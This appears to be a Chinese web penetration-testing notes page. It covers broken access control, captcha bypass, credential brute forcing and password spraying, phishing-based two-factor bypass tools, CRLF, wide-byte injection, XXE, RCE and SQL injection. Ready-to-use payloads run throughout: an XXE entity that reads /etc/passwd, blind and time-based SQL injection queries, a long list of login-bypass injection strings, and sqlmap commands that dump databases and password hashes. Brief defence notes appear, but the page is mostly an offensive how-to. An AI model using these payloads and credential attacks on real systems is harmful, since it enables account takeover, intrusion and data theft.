通常在于你在登录自己账号时，去通过修改参数登录了别人的账号.
或你在登录你的主页后尝试切换别人的id
**发现其他用户**
用户名

> 在注册时如果提示已存在用户 
> 用户的评论等与网页的交互

看id

> 看用户传送到网页端的地址图像等可能含有他的ID
> 看用户主页一般都有ID


#### 垂直越权

前提条件：获取的添加用户的数据包
怎么来的数据包：
1.普通用户前端有操作界面可以抓取数据包
2.通过网站源码本地搭建自己去模拟抓取
3.盲猜


#### 防御

1.前后端同时对用户输入信息进行校验，双重验证机制
2.调用功能前验证用户是否有权限调用相关功能
3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限
4.直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理
5.永远不要相信来自用户的输入，对于可控参数进行严格的检测与过滤

## 登录脆弱
**登录类型**
在多个系统中，用户只需一次登录，各个系统即可感知该用户已经登录。比如阿里系的淘宝和天猫，很明显地我们可以知道这是两个系统，但是你在使用的时候，登录了天猫，淘宝也会自动登录。
### 验证脆弱

#### 开发者不严谨
token（登录者独立令牌）呈现规律性，肉眼可见
通过Session覆盖漏洞重置他人密码
当验证和重置在一个界面时，可能存在此漏洞：重置别人密码时，替换为自己的手机号
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713124740798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
##### 验证码破解

**旧型**

验证码分为字符验证码，滑动，人机设备检测

现在更常见的验证码会在用户输入3-5次后出现

**新型**

语音验证码--将一段语言发送到手机



现在验证码绕过更难了，可能在5年后字符型验证码已经不怎么存在了。但是对于新型验证码还没有与时共进的绕过方案。


###### 弱验证码绕过

**观察**
验证码破解你首先要仔细观察数据包，且要分别尝试对方网站收到正确的验证码和错误的验证码时，网站的返回差异。并获得相关攻破点，比如长度太短等

**方法**
验证码不刷新

验证码抓包绕过：验证码明文显示在数据包中

验证码复用

验证码删除绕过：

验证码置空绕过

验证码过于简单：验证码直接爆破。一般四位数验证码一万次就爆破出来了，大概需要一分钟，六位数验证码也就十分钟左右，有的验证存活时期能达到10分钟以上的，就可以测试。

修改xff头绕过:推荐个burp插件,https://github.com/TheKingOfDuck/burpFakeIP
账号后加空格绕过账号错误次数限制。

修改回显：看是否能直接跳转到请求成功的界面。有的网站直接跳转是根据是否验证成功的状态码，比如当验证成功后网页返回1，失败返回0.服务器接收到1就会直接显示登录成功的网页，如果对方以此为校对这就会产生相应漏洞。这可以用burpsuite的相应到当前请求来做修改
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713135502447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

###### 识别绕过

有的验证码数据包进行了一次修改，验证码就变更了，这时候就需要做识别绕过

字符验证码：

【破解思路】：人工智能/打码平台

滑动验证码：

【破解思路】：底图对比+模拟人滑动速度/打码平台

注册极验api收集全部底图，做自动化对比破解、


**打码平台**

http://www.114sim.com/
https://yunduanxin.net/China-Phone-Number/
https://www.materialtools.com/


**工具**
captcha-killer：
https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210713150556748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

reCAPTCHA等



#### 登陆点暴力破解

##### 社工字典
你可以从以下几个设计思路入手：
月份和年份的数字组合
电话
姓名
生日
查看一些以前泄露出来的数据，找一些有没有目标公司的用户资料泄露，因为相同公司的用户可能会使用类似的密码。
公司名称+年份/编号/特殊的字符 (如!,$,#,@）



**搜集更多信息以及生成他们字典**
https://whois.domaintools.com
http://whois.chinaz.com/
密码爆破如此
whois 查询到所登记的联络人信息，通常是网域管理员，收集他的**个人邮箱**作为密码爆破猜解对象之一。


推荐crunch和cupp，kali中都有，自己也可以根据需要写一些脚本

很多大佬都有几十个G的密码爆破字典，但大家在网上真的很难搜得到，搜得到的大多都是那些随机生成的密码，不具有意义。
在线字典生成器
https://www.bugku.com/mima/


首先收集一些网站的信息针对性的制作字典，比如域名，员工邮箱，企业名称等等,推荐工具:白鹿社工字典生成:https://github.com/HongLuDianXue/BaiLu-SED-Tool
爆破的关键在于字典，常见的字典github上都有,但是普通的弱口令现在确实不太好用了，要想提高成功的机率，还是需要碰一碰强密码，分享先知的文章:
https://xz.aliyun.com/t/7823
#### 常见攻击方法
##### 暴力破解

要是获得已知用户名的hash密码也能破解，具体做法是通过hashid识别hash类型，将用户名和你尝试的密码一一结合起来看是否hash值相等，相等即破解成功。这两种方法都是属于暴力破解，只不过一个是在线的一个是离线的，你仍旧都可以使用hydra破解


**hydra进行暴力破解**

hydra爆破工具，在kali有集成。在kali上有个默认密码字典位于`/usr/share/wordlists`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210603153641755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210519202219784.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

类似工具：snetcrack、超级弱口令




##### 密码喷洒攻击
基本上，密码爆破是用多个密码尝试破解同一个 ID。而密码喷洒攻击，是用一个密码来尝试多个用户ID，以便至少有一个用户 ID 被泄露。对于密码喷洒攻击，黑客使用社交工程或其他网络钓鱼方法收集多个用户 ID。通常情况下，至少有一个用户使用简单的密码，如12345678甚至是 p@ssw0rd。在密码喷洒攻击中，黑客会为他或她收集的所有用户 ID 应用精心构造的密码。因此，密码喷洒攻击可以定义为将相同的密码应用于组织中的多个用户帐户，目的是安全的对其中一个帐户进行未授权访问。暴力破解的问题在于，在使用不同密码进行一定次数的尝试后，系统可能会被锁定。为了避免这种情况，产生了收集用户 ID 并将可能的密码应用于它们的想法。使用密码喷洒攻击时，黑客也会采取一些预防措施。
工具：spray官网地址	http://bit.ly/2EJve6N
使用方法
```bash
spray.sh -owa <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain>
```
ruler有spray类似的功能，但更多的利用ruler获得密码后可以利用此工具做钓鱼文件等https://github.com/sensepost/ruler

##### 获得登录凭证的下一步
破坏邮箱，发送恶意脚本的工具
https://github.com/O365/python-o365
该项目旨在以 Pythonic 的方式轻松地与 Microsoft Graph 和 Office 365 进行交互。访问电子邮件、日历、联系人、OneDrive 等。很容易以一种对初学者来说简单而直接的方式进行，对经验丰富的 Python 程序员来说感觉恰到好处。
#### 防御与绕过方法

 - 服务器端没有做限制，而比如银行卡号密码就做了限制，如果试错次数超过3，那么卡将被冻结，所以一般黑客是会收集多个账号
 - 没有做登录验证或被验证能被绕过
 - 双因素验证，趋势。但是很多网站只对他知名的站点做双因素，而古老的却不加防御
- 明文传输或加密方式被你破解，其中大部分http都是明文传输，大部分https都是加密传输
  

##### 待补充：AI破解
##### 绕过双因素验证
双因素验证绕过是很困难的通常要结合钓鱼来绕过。钓鱼即通过伪造页面截取用户的请求，用模拟软件来将用户的请求反馈到真实网站中，进而完成登录
ReelPhish，https://github.com/fireeye/ReelPhish
还有一些其他工具可以处理不同的双因素验证绕过的情境：

https://github.com/kgretzky/evilginx
https://github.com/ustayready/CredSniper




## CRLF 注入

**简介**
难度：低

通常用在：分享链接
拓展思路：对客户端的攻击，比如投票、跳转、关注等；
绕过安全防护软件；


**实战**

测试链接：

会话固定、XSS、缓存病毒攻击、日志伪造

## 宽字节注入
只要发现使用gbk，韩文、日文等编码时就可以考虑可能存在宽字节注入漏洞。

在%df遇到%5c时，由于%df的ascii大于128，所以会自动拼接%5c，吃掉反斜线。而%27 %20小于ascii(128)的字符就会保留。通常都会用反斜线来转义恶意字符串，但是如果被吃掉后，转义失败，恶意的xss代码可以继续运行。
反斜杠的GBxxx编码为%5C，根据GBxxx编码在前面加上%DE，%DF，%E0。。。都可以组成一个汉字，从而把反斜杠这个转义字符给吃了
%27---------单引号

%20----------空格

%23-----------#号

%5c------------/反斜杠

php中有一个转义字符



## 待整理：XXE

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714132151577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


XML 指可扩展标记语言（EXtensible Markup Language），它是用于存储和传输数据的最常用的语言。和HTML很像，但区别是HTML与数据表示有关，XML与数据内容有关，你可以想想在爬虫中是重视XML格式，因为里面有挺多有价值的数据。XML是一种自我描述语言。它不包含任何预定义的标签，如 <p>、<img> 等。所有标签都是用户定义的，具体取决于它所代表的数据。<email></email>、<message></message> 等
XXE漏洞全称XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，
具体来说是XML的DTD会定义实体部分，实体部分对于XML就像是变量，但他不仅是变量，还可以用来调用本地文件1.txt或外部实体https://baidu.com。正因为这里实体有这么强大的功能，因此也容易被攻击。常见的攻击有任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。

### 学习资料

[【FreeBuf字幕组】WEB安全漏洞介绍-XML外部实体注入攻击（XXE）](https://www.bilibili.com/video/BV1at41177SA/)

### XXE 攻击

#### 自动攻击工具

XXEinjector的漏洞利用工具，XXEinjector是一款基于Ruby的XXE注入工具，它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。
工具地址 https://github.com/enjoiz/XXEinjector

#### 手动攻击

**人工嗅探**
burpsuite爬取后，搜索关键词content-type看对应的值是否有/xml关键字。有的话代表接受XML数据.没有的话看是否能修改成传输XML的格式，即application/xml或text/xml

看传输数据的格式是否接受XML文件 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714133306556.png)
如下图为一个接受XML文件的传输代表例子：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714134047639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**加载payload**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714134317702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### payload

##### 读取文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714121854241.png)

##### 内网、ip、文件探测

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714122215349.png)

##### 引入外部实体DTD

通过将关键代码放在dtd里可以使得上传的xml文本免于管理员的检测
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071412303340.png)

##### 无回显读取文件

如果目标站点没有回显，就将目标站点的文件直接请求到自己服务器
注意这里额外多使用了个base64加密是因为这是php文件读取的方法，php读取文件就不必在写全目录了(当然写全也无可厚非，如下图就是写全的)，如果是同级目录下就是test.txt
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714124614593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
请求的数据包要打开自己服务器看日志才能读取。这里写入到自己服务器理论上应该也可以，但是没有看到XML语言支持写入的 。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714131106544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


许多网站在数据的字符串和传输中使用 XML，如果不采取对策，那么这些信息将受到损害。可能的各种攻击是：
inband
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213839678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

error
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213908352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

oob
无输出，必须要执行一些带外请求才能吧目标数据提取出来
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623213937334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623214220130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623214853494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


#### 远程文件 SSRF

这些文件是攻击者注入远程托管的恶意脚本以获得管理员访问权限或关键信息的文件。我们将尝试获取/etc/passwd为此我们将输入以下命令。

```bash
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE reset [ 
<!ENTITY ignite SYSTEM "file:///etc/passwd"> 
]><reset><login>&ignite;</ login><secret>有任何错误吗？</secret></reset>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604120133412.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
输入上述命令后，只要我们点击发送按钮，我们就会看到 passwd 文件！！
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604131802628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

#### XXE 亿笑攻击-DOS

第一次进行这种攻击时，攻击者使用lol作为实体数据，并在随后的几个实体中多次调用它。执行时间呈指数级增长，结果是一次成功的 DoS 攻击导致网站瘫痪。由于使用 lol 并多次调用它导致了数十亿个请求，我们得到了“Billion Laugh Attack”这个名字
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604115827776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
在这里，我们看到在1 处，我们已经声明了名为“ ignite”的实体，然后在其他几个实体中调用了 ignite，从而形成了一个回调链，这将使服务器过载。在2 处，我们调用了实体&ignite9; 我们已经调用 ignite9 而不是 ignite，因为 ignite9 多次调用 ignite8，每次调用 ignite8 时都会启动 ignite7，依此类推。因此，请求将花费指数级的时间来执行，结果，网站将关闭。
以上命令导致 DoS 攻击，我们得到的输出是：
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210604115949948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


### 防御

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210714142934224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## RCE（远程命令执行）

在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞比如eval().或者一些参数id可以执行echo &id等命令。
当遇到这种漏洞，你可以执行一些敏感命令。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712125552200.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712135852588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

### 实例：网站可执行系统命令

当只允许执行某命令试试管道符。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712125738973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
当弹出这样对话框时，你应该试着去看当前页面的源码，检查是哪个函数导致此结果。
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021071213025048.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
前端验证的你可以通过抓包去修改发送的数据包，从而绕过防御
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712131116302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



## 数据库注入
与数据库交互的操作的常见几种方法为
select 查询数据
在网站应用中进行数据显示查询效果
例： select * from news wher id=$id

insert 插入数据
在网站应用中进行用户注册添加等操作
例：insert into news(id,url,text) values(2,'x','$t')

delete 删除数据
后台管理里面删除文章删除用户等操作
例：delete from news where id=$id

update 更新数据
会员或后台中心数据同步或缓存等操作
例：update user set pwd='$p' where id=2 and username='admin'

order by 排列数据
一般结合表名或列名进行数据排序操作
例：select * from news order by $id
例：select id,name,price from news order by $order

一般而言除了select，有时候select也没有。大多其他数据库操作都无回显。当没有回显时需要用盲注、时间、报错等制作回显。
### 手工注入

**经验：传入不同参数**
当参数为字符型时系统默认带上单引号。当然如果程序员特立独行，也是可以使用`id='1'`的 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705220943443.png)
字符型参数的注入你首先要先对前面的单引号或双引号进行闭合。具体是单引号还是双引号，你要去分析
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705231038748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

****

模糊查询。这种注入需要过滤百分号和单引号
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705221856313.png)



**经验：多个参数注入一个点**
如果链接是 url/?id=1&page=2
id存在注入点，page不存在。这时候你的注入应该采取以下策略：

1. 交换顺序。将url/?id=1&page=2换成url/?page=2&id=1
2. 注入语句插对位置。url/?id=1 and 1=1 &page=2

对于工具你应该告诉它注入点位置，即加一个星号

```bash
url/?id=1*&page=2
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210715234717488.png)


**权限提取**
如果你注入用户root那你相当于获得了数据库所有表的权限，。但有的网站为了安全，是一个页面一个数据库用户，当你获得这个用户的权限，是无法得到整个数据库的权限的![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070517463665.png)


### 制造回显
常用方法如下:
基于布尔的SQL盲注-逻辑判断(不需要回显信息就能看到)(2)
regexp，like，ascii，left，ord，mid

基于时间的SQL盲注-延时判断(不需要回显信息就能看到)(3)
if，sleep

基于报错的SQL盲注-报错回显(优先于选择:1)


#### 报错回显

##### bool类型注入

基于布尔的 SQL 注入要求攻击者向数据库服务器发送一系列布尔查询并分析结果，以推断任何给定字段的值。假设我们发现了一个容易受到盲注攻击的字段，我们想找出用户名。为了做到这一点，我们需要了解一些重要的功能；大多数数据库使用这些的一些变体：
ASCII(character)
SUBSTRING(string, start, length)
LENGTH(string)

###### 制作布尔查询

**慢慢尝试**
通过使用这些函数，我们可以开始测试第一个字符的值，一旦确定，我们就可以继续下一个，依此类推，直到整个值（在这种情况下，用户名）被发现。看看下面的 URL，我们知道它很容易通过插入尾随单引号被注入：

```bash
https://exampleurl.com/login.php?id=1'
```

使用布尔漏洞利用，我们可以制作要在服务器上执行的查询，最终看起来像这样：

```bash
SELECT  *
FROM    Users
WHERE   UserID = '1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'
```

让我们分解一下。内部函数总是先执行，所以 SUBSTRING() 取用户名字符串的第一个字符并将长度限制为 1；这样，我们可以一次遍历每个字符，直到到达字符串的末尾。

接下来，ASCII() 函数以我们刚获得的字符作为参数运行。语句的其余部分基本上只是一个条件：如果这个字符的 ASCII 值等于 97（即“a”），并且 1=1 为真（它总是如此），那么整个语句是真的，我们有正确的性格。如果返回 false，那么我们可以将 ASCII 值从 97 增加到 98，并重复该过程直到它返回 true。

例如，如果我们知道用户名是“jsmith”，那么在达到 106（即“j”的 ASCII 值）之前，我们不会看到返回 true。一旦我们获得了用户名的第一个字符，我们就可以通过重复此过程并将 SUBSTRING() 的起始位置设置为 2 来继续下一个字符
**结束程序**
测试基于布尔的注入时需要做的最后一件事是确定何时停止，即知道字符串的长度。一旦我们达到空值（ASCII 代码 0），那么我们要么完成并发现整个字符串，要么字符串本身包含一个空值。我们可以通过使用 LENGTH() 函数来解决这个问题。假设我们试图获取的用户名是“jsmith”，那么查询可能如下所示：

```bash
SELECT  *
FROM    Users
WHERE   UserID = '1' AND LENGTH(username) = 6 AND '1' = '1'
```

如果返回 true，则我们已成功识别用户名。如果返回 false，则字符串包含空值，我们需要继续该过程，直到发现另一个空字符。

##### 时间SQL注入

IF() 函数接受三个参数：条件、条件为真时返回什么、条件为假时返回什么。
MySQL 还有一个名为 BENCHMARK() 的函数，可用于基于时间的注入攻击。将执行表达式的次数作为其第一个参数，将表达式本身作为第二个参数。

###### 制作时间SQL注入

基于时间的 SQL 注入涉及向数据库发送请求并分析服务器响应时间以推断信息。我们可以通过利用数据库系统中使用的睡眠和时间延迟功能来做到这一点。像以前一样，我们可以使用 ASCII() 和 SUBSTRING() 函数来帮助枚举字段以及名为 SLEEP() 的新函数。让我们检查以下发送到服务器的 MySQL 查询：

```bash
SELECT  *
FROM    Users
WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, SLEEP(10), 'false')
```

基本上，这表明如果用户名的第一个字符是“a”(97)，则运行 CURTIME() 一千万次。CURTIME() 返回当前时间，但这里传递的函数并不重要；但是，重要的是要确保该函数运行足够多的时间以产生重大影响。

```bash
WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, BENCHMARK(10000000, CURTIME()), 'false')

```

###### 其他数据库的时间注入

PostgreSQL 使用 pg_sleep() 函数：

```bash
WHERE   UserID = 1 AND IF(ASCII(SUBSTRING(username,1,1)) = 97, pg_sleep(10), 'false')

```


Oracle 更具挑战性，因为注入睡眠函数通常需要在PL/SQL块中完成。PL/SQL 是 Oracle 对 SQL 的扩展，其中包括过程编程语言的元素。它不太可能发生，但基于时间的注入看起来像这样：

```bash
BEGIN DBMS_LOCK.SLEEP(15); END;

```

### 使用万能密码对登录页注入

产生原因是管理员都会用户输入的用户名和密码进行数据库查询操作。
由于是字符串查询，由前文可知字符串注入都需要闭合引号。

```bash
asp aspx万能密码
1： "or "a"="a
2： ')or('a'='a
3：or 1=1--
4：'or 1=1--
5：a'or' 1=1--
6： "or 1=1--
7：'or'a'='a
8： "or"="a'='a
9：'or''='
10：'or'='or'
11: 1 or '1'='1'=1
12: 1 or '1'='1' or 1=1
13: 'OR 1=1%00
14: "or 1=1%00
15: 'xor
16: 新型万能登陆密码

用户名 ' UNION Select 1,1,1 FROM admin Where ''=' （替换表名admin）
密码 1
Username=-1%cf' union select 1,1,1 as password,1,1,1 %23
Password=1



PHP万能密码

'or'='or'

'or 1=1/* 字符型 GPC是否开都可以使用

User: something
Pass: ' OR '1'='1

jsp 万能密码

1'or'1'='1

admin' OR 1=1/*

用户名：admin 系统存在这个用户的时候 才用得上
密码：1'or'1'='1
pydictor、cupp、crunch字典生成工具、自写字典生成py（小黑的人名字典py）；
dymerge字典合并去重工具、自己写去重py；
```

#### 用户名不存在

先爆破用户名，再利用被爆破出来的用户名爆破密码。
其实有些站点，在登陆处也会这样提示
所有和数据库有交互的地方都有可能有注入。

**什么也不被过滤**

```bash
什么也不被过滤时，使用已知用户名登录
输入  用户名 admin' and 1=1 #  密码随便输入
当什么都没被过滤时，只是这种网站已经寥寥无几了
select * from admin where username='admin' and 1=1 #' and password='123456' OR 
```

```bash
什么也不被过滤时，不知道用户名登录（知道用户名和不知道区别在于是使用and还是or）
输入   用户名  admin'or 1 #    密码随便输入
当什么都没被过滤时，只是这种网站已经寥寥无几了
select * from admin where username='admin'or 1 #' and password='123456' 
```

**发现'没有被过滤，or，--+，#被过滤**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210518203512468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

```bash
输入  用户名 reborn'='  密码 reborn'='
select * from user where username='reborn'='' and password='reborn'=''
```

**空格被过滤**

>利用URL对制表符的转义将空格替代为%09
>
>sql注入常常在URL地址栏、登陆界面、留言板、搜索框等。这往往给骇客留下了可乘之机。轻则数据遭到泄露，重则服务器被拿下。。攻击者甚至能够完成远程命令执行。这是最常见的一个话题了，网上有很多帮助初学者的且全的小白文章[这篇还行](https://www.anquanke.com/post/id/235970)
>


**SQL注入步骤**
[sql注入实例，靶机测试实例详细,适合新手](https://www.cnblogs.com/shenggang/p/12144945.html)
[招聘网站sql注入](https://www.cnblogs.com/shenggang/p/12144945.html)

#### 1. 判断是否存在注入点

判断注入点的方法很多，只要一个返回真一个返回假就可以，如下也可以进行判断。如果你总尝试什么and 1=1 与and 1=2 你的请求很容易被拦截
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705150513612.png)

#### 2. 判断列数

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151215106.png)


#### 3. 信息搜集

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705151433704.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070516233053.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162639732.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162748179.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705162828198.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705180805985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705181025600.png)




### sql注入过程：sqlmap
使用sqlmap 步骤是：

```python
# 1.判断链接是否可注入
# 手工:当你想要寻找界面是否含有注入点，你应该警惕源码中含有?的URL链接测试比如？id=1和？id=1'看界面返回区别，或者是附上？id=1 and 1=1 和？id=1 and 1=2；或者是+1 和-1 注意这里+在url编码中有特殊含义，记得将+编码为%2b
sqlmap -u URL --level 5 --batch --random-agent#  当url参数大于1时需要将url用“”引起来。


# 2. 如果可注入，查询当前用户下所有数据库。不可注入的话，就没有后续步骤了。
# 手工: order by 3
# 手工: id=-1 union select 1, database(), 3 # UNION的作用是将两个select查询结果合并
sqlmap -u URL --dbs # --dbs也可以缩写为-D

# 3. 如果可查询到数据库，则进行查询数据库中表名
sqlmap -u URL -D 数据库名  --tables # --tables可以缩写为-T

# 4.规则同上
sqlmap -u URL -D 数据库名  -T 表名 --columns 


# 5.规则同上，字段内容
sqlmap -u URL -D 数据库名  -T 表名  -C 列名 --dump
```

其他有用命令

```python
sqlmap -u URL --users
sqlmap -u  URL --passwords # 要是密码加密请在网站cmd5中解密
sqlmap -u URL --current-db
sqlmap -u URL --current-user
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708204428465.png)
你可以点击以下文章以便了解更多使用
[这篇热门文章对sqlmap做了详细的解释](https://www.freebuf.com/sectool/164608.html)
[sqlmap使用简要版](https://blog.csdn.net/weixin_43729943/article/details/104169193)
sqlmap tamper使用
**sql其他注入工具**
sqlmap
Pangolin
Havij
**防止SQL注入**
严格验证数据类型、长度和合法的取值范围
特殊字符转义

**经验**
前辈经验发现：sql注入还可能存在注册中输入号码部分；

#### tamper 自定义

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708185301610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


